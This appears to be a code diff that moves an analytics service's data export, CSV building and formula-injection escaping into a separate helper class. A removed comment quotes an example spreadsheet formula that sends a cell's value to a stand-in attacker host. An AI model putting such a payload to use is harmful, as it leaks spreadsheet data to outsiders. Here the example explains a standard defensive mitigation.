@@ -8,6 +8,7 @@ import { Conversation } from '../../entities/conversation.entity';
 import { Message } from '../../entities/message.entity';
 import { AuditLog } from '../../entities/audit-log.entity';
 import { AgentRun } from '../../entities/agent-run.entity';
+import { AnalyticsExportHelper } from './analytics-export.helper';
 
 export interface RequestLogQuery {
   organizationId: string;
@@ -48,6 +49,7 @@ export class AnalyticsService {
     private readonly auditLogRepository: Repository<AuditLog>,
     @InjectRepository(AgentRun)
     private readonly agentRunRepository: Repository<AgentRun>,
+    private readonly exportHelper: AnalyticsExportHelper,
   ) {}
 
   async getOverview(organizationId: string) {
@@ -541,119 +543,9 @@ export class AnalyticsService {
     };
   }
 
-  async exportData(query: ExportQuery): Promise<any> {
-    // Every export type MUST be org-scoped. Without this, an
-    // authenticated user could download every request log / tool
-    // execution / LLM session across every org in the database.
-    if (!query.organizationId) {
-      throw new Error('exportData requires organizationId');
-    }
-    const from = query.from || new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
-    const to = query.to || new Date();
 
-    if (query.type === 'requests') {
-      // Same JOIN-via-gateway scoping as getRequestLogs, because
-      // RequestLog has no direct organizationId column. Use a
-      // query builder instead of the repository's find() so we can
-      // add the inner join cleanly.
-      const logs = await this.requestLogRepository
-        .createQueryBuilder('log')
-        .innerJoin('log.gateway', 'gw')
-        .where('gw.organizationId = :orgId', { orgId: query.organizationId })
-        .andWhere('log.timestamp BETWEEN :from AND :to', { from, to })
-        .orderBy('log.timestamp', 'DESC')
-        .take(10000)
-        .getMany();
-
-      if (query.format === 'csv') {
-        return this.toCsv(logs, [
-          'id', 'method', 'path', 'statusCode', 'responseTime',
-          'userAgent', 'ipAddress', 'gatewayId', 'toolId', 'userId',
-          'errorMessage', 'requestSize', 'responseSize', 'timestamp',
-        ]);
-      }
-      return logs;
-    }
-
-    if (query.type === 'tool-executions') {
-      const execs = await this.toolExecutionRepository.find({
-        where: {
-          organizationId: query.organizationId,
-          createdAt: Between(from, to),
-        },
-        order: { createdAt: 'DESC' },
-        take: 10000,
-      });
-
-      if (query.format === 'csv') {
-        return this.toCsv(execs, [
-          'id', 'toolId', 'userId', 'organizationId', 'success',
-          'executionTime', 'cached', 'retryCount', 'error', 'createdAt',
-        ]);
-      }
-      return execs;
-    }
-
-    if (query.type === 'llm-sessions') {
-      const sessions = await this.conversationRepository.find({
-        where: {
-          organizationId: query.organizationId,
-          createdAt: Between(from, to),
-        },
-        order: { createdAt: 'DESC' },
-        take: 10000,
-      });
-
-      if (query.format === 'csv') {
-        return this.toCsv(sessions, [
-          'id', 'providerId', 'type', 'status', 'messageCount',
-          'totalInputTokens', 'totalOutputTokens', 'totalCost',
-          'toolCalls', 'successfulToolCalls', 'createdAt', 'completedAt',
-        ]);
-      }
-      return sessions;
-    }
-
-    return [];
-  }
-
-  private toCsv(data: any[], columns: string[]): string {
-    const header = columns.join(',');
-    const rows = data.map(item =>
-      columns.map(col => this.escapeCsvCell(item[col])).join(','),
-    );
-    return [header, ...rows].join('\n');
-  }
-
-  /**
-   * Escape a CSV cell value. Handles two separate concerns:
-   *
-   *   1. Syntax quoting (the standard RFC 4180 rule): wrap in double
-   *      quotes and double any embedded quotes when the cell contains
-   *      `,`, `"`, `\r`, or `\n`.
-   *
-   *   2. Formula injection mitigation: a cell whose first character is
-   *      `=`, `+`, `-`, `@`, `\t`, or `\r` will be interpreted as a
-   *      formula by Excel / LibreOffice Calc / Google Sheets when the
-   *      CSV is opened. An attacker could craft a tool name like
-   *      `=HYPERLINK("http://evil/?"&A1,"click")` and steal another
-   *      cell's value when an admin exports the CSV. We prepend a
-   *      single quote (`'`) to any such cell. This is the standard
-   *      OWASP mitigation for CSV injection.
-   */
-  private escapeCsvCell(val: any): string {
-    if (val === null || val === undefined) return '';
-    let str = String(val);
-
-    // Formula-injection mitigation BEFORE syntax quoting.
-    if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
-      str = `'${str}`;
-    }
-
-    if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
-      return `"${str.replace(/"/g, '""')}"`;
-    }
-    return str;
+  exportData(...args: Parameters<AnalyticsExportHelper['exportData']>) {
+    return this.exportHelper.exportData(...args);
   }
 
   private getTimeframeDate(timeframe: string): Date {
